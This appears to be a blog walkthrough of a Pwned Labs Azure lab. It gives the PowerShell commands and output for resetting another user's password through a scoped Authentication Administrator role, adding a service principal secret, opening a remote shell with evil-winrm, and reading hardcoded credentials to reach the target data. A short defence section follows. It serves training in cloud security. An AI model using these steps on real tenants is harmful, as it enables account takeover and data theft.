---
title: Execute Azure Credential Shuffle to Achieve Objectives
description: Execute Azure Credential Shuffle to Achieve Objectives
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
After gaining initial access, your red team found credentials in the connection string of a compromised Azure Web App. You have been tasked with gaining further access to Mega Big Tech's Azure environment, and achieving the objectives of the engagement by accessing sensitive data.

Mega Big Tech will begin rolling out their own External Authentication Provider to reduce yearly operating costs. However, threat actors have already compromised the custom provider and altered its configuration. As a result, any Multifactor Authentication (MFA) challenge will now automatically return as successful, ultimately satisfying any Conditional Access Policy (CAP) that requires the standalone-MFA grant control (as opposed to the Authentication Strength-MFA grant control).
# Walkthrough
Authenticate using given credentials
```
└─PS> Connect-AzAccount -AccountId "dbuser@megabigtech.com"
Please select the account you want to login with.

Retrieving subscriptions for the selection...

[Announcements]
With the new Azure PowerShell login experience, you can select the subscription you want to use more easily. Learn more about it and its configuration at https://go.microsoft.com/fwlink/?linkid=2271909.

If you encounter any problem, please open an issue at: https://aka.ms/azpsissue

Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship Default Directory
```
```
└─PS> connect-MgGraph
Welcome to Microsoft Graph!

Connected via delegated access using 14d82eec-204b-4c2f-b7e8-296a70dab67e
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.
```
Let's check if the user belongs to a security group or if a directory role has been assigned
```
└─PS> Get-MgUserMemberOf -UserId dbuser@megabigtech.com | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}

$_.AdditionalProperties["displayName"]
--------------------------------------
Default Directory
Yolo-MFA

```

Nothing interesting. It's a good idea to check if there are administrative units and if any roles assigned at this level. According to Microsoft [documentation](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units) "Administrative units restrict permissions in a role to any portion of your organization that you define. You could, for example, use administrative units to delegate the Helpdesk Administrator role to regional support specialists, so they can manage users only in the region that they support". In terms of Active Directory, this sounds similar to the purpose of Organizational Units (OUs). 
```
└─PS> Get-MgDirectoryAdministrativeUnit | fl                                                                                                                                                                                                

DeletedDateTime               : 
Description                   : Scope to manage the authentication settings for the users belonging to the project.
DisplayName                   : Megabigtech-UNIT1
Extensions                    : 
Id                            : 47e4803e-a5ef-4ebc-b967-691815870abd
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}
<SNIP>
```

Let's check if any Entra ID users have been assigned a role scoped to this administrative unit. And it shows our current user
```
└─PS> Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId 47e4803e-a5ef-4ebc-b967-691815870abd | Select-Object roleMemberInfo,roleId -ExpandProperty roleMemberInfo

DisplayName Id
----------- --
dbuser      c25a3a89-a504-4b80-9b67-8219da75ef59
```

Let's see what role were assigned.
```
└─PS> Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId 47e4803e-a5ef-4ebc-b967-691815870abd | fl

AdministrativeUnitId : 47e4803e-a5ef-4ebc-b967-691815870abd
Id                   : t3O2zIerwE-HxTl1GgSVOT6A5EfvpbxOuWdpGBWHCr2JOlrCBKWAS5tnghnade9ZU
RoleId               : ccb673b7-ab87-4fc0-87c5-39751a049539
RoleMemberInfo       : Microsoft.Graph.PowerShell.Models.MicrosoftGraphIdentity
AdditionalProperties : {}

```

Now let's retrieve which role the `RoleId: ccb673b7-ab87-4fc0-87c5-39751a049539` corresponds to.
```
$roleId = "ccb673b7-ab87-4fc0-87c5-39751a049539"
$directoryRoles = Get-MgDirectoryRole | Where-Object { $_.Id -eq $roleId }
$directoryRoles | Format-List *
```
```
└─PS> $directoryRoles | Format-List *

DeletedDateTime      : 
Description          : Allowed to view, set and reset authentication method information for any non-admin user.
DisplayName          : Authentication Administrator
Id                   : ccb673b7-ab87-4fc0-87c5-39751a049539
Members              : 
RoleTemplateId       : c4e39bd9-1100-46d3-8c65-fb160da0071f
ScopedMembers        : 
AdditionalProperties : {}
```

The Microsoft [documentation](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#authentication-administrator) reveals that this is a privileged role that has the ability to set passwords for non-administrators. It's not possible to get the value of user passwords in Azure. Let's query members of the administrative unit.
```
└─PS> Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId 47e4803e-a5ef-4ebc-b967-691815870abd | Select * -ExpandProperty additionalProperties                                                                                    

Key               Value
---               -----
@odata.type       #microsoft.graph.user
businessPhones    {}
displayName       Daiki Hiroko
givenName         Daiki
jobTitle          Mid Developer
surname           Hiroko
userPrincipalName Daiki.Hiroko@megabigtech.com

```

Bsaed on that, the user `dbuser@megabigtech.com` has been assigned the `Authentication Administrator` role at the level of the administrative unit `Megabigtech-UNIT1`, and we know that `Daiki.Hiroko@megabigtech.com` is member of this administrative unit. This means that as `dbuser` we are able to change the password for `Daiki Hiroko`. Let's set a new password for Daiki Hiroko. Note that this is a disruptive action and not the best `opsec`, and should only be attempted if there are no alternative paths.
```
$passwordProfile = @{
    forceChangePasswordNextSignIn = $false
    forceChangePasswordNextSignInWithMfa = $false
    password = "Password12345!!"
}
```
```
└─PS> Update-MgUser -UserId 'Daiki.Hiroko@megabigtech.com' -PasswordProfile $passwordProfile
```

Authenticate as `Daiki.Hiroko@megabigtech.com`
```
Connect-MgGraph
Connect-AzAccount
```

Let's enumerate with our new user
```
└─PS> Get-MgUserOwnedObject -UserId Daiki.Hiroko@megabigtech.com | Select * -ExpandProperty additionalProperties

Key                               Value
---                               -----
@odata.type                       #microsoft.graph.application
appId                             3626d80c-9f3b-48f9-a445-65a1ad9129af
createdDateTime                   2023-12-17T02:22:46Z
displayName                       daiki-appspn
identifierUris                    {}
publisherDomain                   megabigtech.com
signInAudience                    AzureADMyOrg
tags                              {}
addIns                            {}
api                               {[knownClientApplications, System.Object[]], [oauth2PermissionScopes, System.Object[]], [preAuthorizedApplications, System.Object[]]}
appRoles                          {}
info                              {}
keyCredentials                    {}
parentalControlSettings           {[countriesBlockedForMinors, System.Object[]], [legalAgeGroupRule, Allow]}
passwordCredentials               {System.Collections.Generic.Dictionary`2[System.String,System.Object], System.Collections.Generic.Dictionary`2[System.String,System.Object], System.Collections.Generic.Dictionary`2[System.String,Syste…
publicClient                      {[redirectUris, System.Object[]]}
requiredResourceAccess            {System.Collections.Generic.Dictionary`2[System.String,System.Object]}
verifiedPublisher                 {}
web                               {[redirectUris, System.Object[]], [implicitGrantSettings, System.Collections.Generic.Dictionary`2[System.String,System.Object]], [redirectUriSettings, System.Object[]]}
servicePrincipalLockConfiguration {[isEnabled, True], [allProperties, True], [credentialsWithUsageVerify, True], [credentialsWithUsageSign, True]…}
spa                               {[redirectUris, System.Object[]]}


```
This reveals that they own an application named `daiki-appspn`, which gives them control over the service principal associated with the app. When registering an application in Azure AD, a service principal is automatically created in the tenant. Think of service principals like well-known service accounts, those accounts will be an special kind of identity in our tenant that we can assign RBAC roles in the subscription. An example scenario will be a web application that is using a managed identity, which is a special kind of service principal. This identity can be assigned a Role to access to other back end resources such as storage accounts, key vaults and databases.

Service principals have versatile authentication options, allowing the use of either secrets or certificates. Users holding the application administrator role or service principal owners possess the ability to introduce new secrets (application passwords) or certificates. In this scenario, it is beneficial since adding new secrets does not disrupt functionality. Additionally, service principals, unlike typical users, are excluded from multi-factor authentication (MFA) and undergo less monitoring and scrutiny.

We can use the Microsoft Graph cmdlets to add a new secret to the service principal
```
#$userId = (Get-MgUser -Filter "userPrincipalName eq 'Daiki.Hiroko@megabigtech.com'").Id
$appId = (Get-MgUserOwnedObject -UserId "01cefafa-a156-46ec-9b0c-ce6b625144a2").Id  

$passwordCred = @{
   displayName = 'Created in PowerShell'
}

# Create a new password credential
$newPassword = Add-MgApplicationPassword -applicationId $appId -PasswordCredential $passwordCred

# print the password
$newPassword.SecretText
```
It worked
```
└─PS> $newPassword.SecretText
<REDACTED>
```
Authenticate as the service principal. Set the app secret value below with the `secretText` value from the command above.
```
$appsecret = ConvertTo-SecureString "<REDACTED>" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('3626d80c-9f3b-48f9-a445-65a1ad9129af',$appsecret) 

Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant '2590ccef-687d-493b-ae8d-441cbab63a72' 
```

After getting a new PowerShell Az session we can start the process of enumeration.First step to check the resources that are accessible to the service principal and listing any RBAC roles that may be assigned to them.
```
└─PS> Get-AzResource
```
```
└─PS> Get-AzRoleAssignment

RoleAssignmentName : eb32db72-fea7-40be-b2b0-2354dceac4e6
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourcegroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv/blobServices/default/containers/general-purpose/providers/Microsoft.Authorization
                     /roleAssignments/eb32db72-fea7-40be-b2b0-2354dceac4e6
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourcegroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv/blobServices/default/containers/general-purpose
DisplayName        : daiki-appspn
SignInName         : 
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : f92ac1b8-937e-4cb1-8555-572c57e00331
ObjectType         : ServicePrincipal
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : 841dacca-616b-46e8-8086-8559aa0ba013
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourcegroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv/blobServices/default/containers/general-purpose/providers/Microsoft.Authorization
                     /roleAssignments/841dacca-616b-46e8-8086-8559aa0ba013
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourcegroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv/blobServices/default/containers/general-purpose
DisplayName        : daiki-appspn
SignInName         : 
RoleDefinitionName : Storage Blob Data Reader
RoleDefinitionId   : 2a2b9908-6ea1-4ae2-8e65-a410df84e7d1
ObjectId           : f92ac1b8-937e-4cb1-8555-572c57e00331
ObjectType         : ServicePrincipal
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 
```

No resources, but we have the `Reader` and `Storage Blob Data Reader` roles scoped to the `general-purpose` storage container within a storage account. The reason why `Get-AzResource` didn't return these resources, is because `Get-AzResource` returns a resource only when the caller’s role assignment includes the ARM action `Microsoft.Resources/subscriptions/resourceGroups/read` (present in roles like `Reader` or `Contributor`) at the resource’s scope or any parent ARM scope. Assignments that are limited to data-plane scopes such as a blob container, or roles like `Storage Blob Data Reader`, lack this action and therefore prevent the resource from appearing.

Let's see the permissions that the `Storage Blob Data Reader` role has
```
└─PS> Get-AzRoleDefinition -Name "Storage Blob Data Reader"                                                                                                                                                                                 

Name             : Storage Blob Data Reader
Id               : 2a2b9908-6ea1-4ae2-8e65-a410df84e7d1
IsCustom         : False
Description      : Allows for read access to Azure Storage blob containers and data
Actions          : {Microsoft.Storage/storageAccounts/blobServices/containers/read, Microsoft.Storage/storageAccounts/blobServices/generateUserDelegationKey/action}
NotActions       : {}
DataActions      : {Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read}
NotDataActions   : {}
AssignableScopes : {/}
Condition        : 
ConditionVersion : 

```

Permissions in Azure are defined as `Actions` for the control plane and `DataActions` for the data plane. We manage resources through the control plane and then interact with the resource (such as querying, reading and writing data) through data plane operations.

In this case we can list and read blobs from the `general-purpose` container
```
$context = New-AzStorageContext -StorageAccountName storageqaenv
$containername = (Get-AzStorageContainer -Context $context -Name general-purpose).name
Get-AzStorageBlob -Container $containername -Context $context
```
```
└─PS> Get-AzStorageBlob -Container $containername -Context $context
                                                                                                                        
   AccountName: storageqaenv, ContainerName: general-purpose                                                            
                                                                                                                        
Name                 BlobType  Length          ContentType                    LastModified         AccessTier SnapshotTime                 IsDeleted  VersionId
----                 --------  ------          -----------                    ------------         ---------- ------------                 ---------  ---------
Dev-cred.txt         BlockBlob 348             text/plain                     2023-12-19 05:10:07Z Hot                                     False      
Release_Notes.txt    BlockBlob 219             text/plain                     2023-12-17 03:55:14Z Hot                                     False      
Terms and Condition… BlockBlob 354             text/plain                     2023-12-17 03:55:14Z Hot                                     False      
meeting_minutes.txt  BlockBlob 308             text/plain                     2023-12-17 03:41:45Z Hot                                     False      
```
Let's download `Dev-cred.txt` blob 
```
└─PS> Get-AzStorageBlobContent -Container $containerName -Blob Dev-cred.txt -Context $context                                                                                                                                               
                                                                                                                        
   AccountName: storageqaenv, ContainerName: general-purpose                                                            
                                                                                                                        
Name                 BlobType  Length          ContentType                    LastModified         AccessTier SnapshotTime                 IsDeleted  VersionId
----                 --------  ------          -----------                    ------------         ---------- ------------                 ---------  ---------
Dev-cred.txt         BlockBlob 348             text/plain                     2023-12-19 05:10:07Z Hot                                     False      
```
It contains credentials to establish a PowerShell Remoting session on the virtual machine as de`vuser
```
└─PS> cat ./Dev-cred.txt

# credentials for the DEV team
$passw = ConvertTo-SecureString "<REDACTED>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('devuser',$passw)

$vm = New-PSSession -ComputerName 172.191.90.57 -Credential $cred -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $vm
```
Let's connect to VM using new credentials via `evil-winrm` (we could also connect via `ssh` since port scan showed that SSH was open)
```
└─$ evil-winrm -i 172.191.90.57 -u devuser -p '<REDACTED>'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\devuser\Documents> 

```
We are unprivileged user and theres nothing interesting returned from [PrivescCheck](https://github.com/itm4n/PrivescCheck)
```
*Evil-WinRM* PS C:\Users\devuser\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Let's also query the metadata service that exists on Azure VMs, which is a RESTful web service available at the well-known link-local IP address `169.254.169.254`
```
*Evil-WinRM* PS C:\Users\devuser\Documents> Invoke-RestMethod -Headers @{"Metadata"="true"} -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | fl *


compute : @{azEnvironment=AzurePublicCloud; customData=; evictionPolicy=; isHostCompatibilityLayerVm=true; licenseType=; location=eastus; name=DevTeamVM; offer=WindowsServer; osProfile=; osType=Windows; placementGroupId=; plan=;
          platformFaultDomain=0; platformUpdateDomain=0; priority=; provider=Microsoft.Compute; publicKeys=System.Object[]; publisher=MicrosoftWindowsServer; resourceGroupName=MBT-RG-1;
          resourceId=/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/MBT-RG-1/providers/Microsoft.Compute/virtualMachines/DevTeamVM; securityProfile=; sku=2019-datacenter-gensecond; storageProfile=;
          subscriptionId=ceff06cb-e29d-4486-a3ae-eaaec5689f94; tags=; tagsList=System.Object[]; userData=; version=17763.5206.231202; vmId=b79a006b-2442-495b-b3ba-2e5b56387957; vmScaleSetName=; vmSize=Standard_B2s; zone=}
network : @{interface=System.Object[]}

```
When given access to Azure VM, it's also useful to check for the presence of a custom script extension. Azure offers a wide range of virtual machine extensions designed to streamline post-deployment tasks on VMs. These tasks cover various activities such as anti-virus deployment, VM configuration, as well as application deployment and monitoring. One notable extension in this suite is the Custom Script Extension.

The Custom Script Extension can download and execute a script from a user-specified location such as blob storage. While they are commonly used for one-time setup tasks, such as installing server components, the extension allows for running any arbitrary scripts, enabling admins to perform virtually any desired action. What makes this an attractive attack vector is that the extension run the scrips as SYSTEM on the VM.

It's worth noting that these scripts are stored in a well-known location, and that this location is also accessible by unprivileged users. Scripts are worth checking out as they may revel interesting data such as other resources to explore, or even credentials used to perform actions on other systems.
```
*Evil-WinRM* PS C:\Users\devuser\Documents> ls C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\


    Directory: C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/18/2023  11:10 PM                1.10.15

```

Inside we find the script `customextensiontext.ps1`, which contains hardcoded credentials
```
*Evil-WinRM* PS C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.15\Downloads\0> cat customextensiontest.ps1
$passwd = ConvertTo-SecureString "<REDACTED>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('serveruser',$passwd)
$PSSession1 =  New-PSSession -ComputerName 192.168.10.8 -Credential $cred -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Copy-Item -FromSession $PSSession1 -Path C:\server\serversetup.exe -Destination \C:\server\serversetup.exe â€“Verbose
```

We don't see a `serveruser` account in the VM. We also can't connect to the VM as the user `edrian` with found password, and the remote machine in the script (IP address `192.168.10.8`) is also not accessible.
```
*Evil-WinRM* PS C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.15\Downloads\0> net users

User accounts for \\

-------------------------------------------------------------------------------
DefaultAccount           devuser                  edrian
Guest                    sshd                     WDAGUtilityAccount
The command completed with one or more errors.

```

Let’s check if a `serveruser` user account exists in the tenant (adding the `megabigtech.com` domain), and test using the password we found. We successfully authenticate as a `serveruser` user account
```
└─PS> connect-AzAccount -AccountId 'serveruser@megabigtech.com'                                                                                                                                                                             
Please select the account you want to login with.

Retrieving subscriptions for the selection...

[Announcements]
With the new Azure PowerShell login experience, you can select the subscription you want to use more easily. Learn more about it and its configuration at https://go.microsoft.com/fwlink/?linkid=2271909.

If you encounter any problem, please open an issue at: https://aka.ms/azpsissue

Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship Default Directory
```

Our new user has access to the storage account named `storageqaenv` 
```
└─PS> Get-AzResource 

Name              : storageqaenv
ResourceGroupName : mbt-rg-1
ResourceType      : Microsoft.Storage/storageAccounts
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv
Tags              : 

```
Our current user has been assigned the `Reader` and `Storage Blob Data Reader` roles scoped to the storage account account
```
└─PS> Get-AzRoleAssignment -SignInName serveruser@megabigtech.com                                                                                                                                                                           

RoleAssignmentName : ef3e6d33-a06f-4ac3-b0dc-f3dc9447cc37
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv/providers/Microsoft.Authorization/roleAssignments/ef3e6d33-a06f-4ac3-b0dc-f3dc944
                     7cc37
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv
DisplayName        : serveruser
SignInName         : serveruser@megabigtech.com
RoleDefinitionName : Storage Blob Data Reader
RoleDefinitionId   : 2a2b9908-6ea1-4ae2-8e65-a410df84e7d1
ObjectId           : b6041627-3894-4c04-94cc-6909aad9db25
ObjectType         : User
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : c570397c-1412-4728-adc9-ed6cd81af263
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv/providers/Microsoft.Authorization/roleAssignments/c570397c-1412-4728-adc9-ed6cd81
                     af263
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-1/providers/Microsoft.Storage/storageAccounts/storageqaenv
DisplayName        : serveruser
SignInName         : serveruser@megabigtech.com
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : b6041627-3894-4c04-94cc-6909aad9db25
ObjectType         : User
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

```

Seems like we have gained access to additional storage containers
```
$context = New-AzStorageContext -StorageAccountName storageqaenv
Get-AzStorageContainer -Context $context
```
```
└─PS> Get-AzStorageContainer -Context $context                                                                                                                                                                                              

   Storage Account Name: storageqaenv

Name                 PublicAccess         LastModified                   IsDeleted  VersionId
----                 ------------         ------------                   ---------  ---------
general-purpose                           12/17/2023 2:53:12 AM +00:00              
patent-documents                          12/17/2023 4:12:44 AM +00:00              
server-files                              12/18/2023 11:08:26 PM +00:00             
```

Our goal was trying to access sensitive data belonging to Mega Big Tech, the `patent-documents` storage container seems to have what we are looking for. Let’s list the available blobs within this container.
```
└─PS> Get-AzStorageBlob -Container patent-documents -Context $context
                                                                                                                        
   AccountName: storageqaenv, ContainerName: patent-documents                                                           
                                                                                                                        
Name                 BlobType  Length          ContentType                    LastModified         AccessTier SnapshotTime                 IsDeleted  VersionId
----                 --------  ------          -----------                    ------------         ---------- ------------                 ---------  ---------
Granted Patent.txt   BlockBlob 39              text/plain                     2023-12-22 14:43:40Z Hot                                     False      
          
```
Let's download the sensitive data and successfully complete the lab
```
└─PS> Get-AzStorageBlobContent -Container patent-documents -Blob "Granted Patent.txt" -Context $context
                                                                                                                        
   AccountName: storageqaenv, ContainerName: patent-documents

Name                 BlobType  Length          ContentType                    LastModified         AccessTier SnapshotTime                 IsDeleted  VersionId
----                 --------  ------          -----------                    ------------         ---------- ------------                 ---------  ---------
Granted Patent.txt   BlockBlob 39              text/plain                     2023-12-22 14:43:40Z Hot                                     False      

```

# Attack Path
Attack path visualization created by [Mathias Persson](https://www.linkedin.com/in/mathias-persson-582b60197/) for Pwned Labs

![](execute-azure-credential-shuffle-to-achieve-objectives-1.png)

# Defense
- Use Azure Key Vault or a password manager, and ideally also set passwords where practical to automatically rotate instead of hardcoded credentials
  - Or store the passwords in an environment variable on the VM instead.
  - Alternatively a VM could be configured to use managed identity, which could be assigned permissions to Azure services and resources. 
    - Although this could prevent lateral movement to a new user, it would still be possible to access the resources as the managed identity.
- Restrict access to resources at the network layer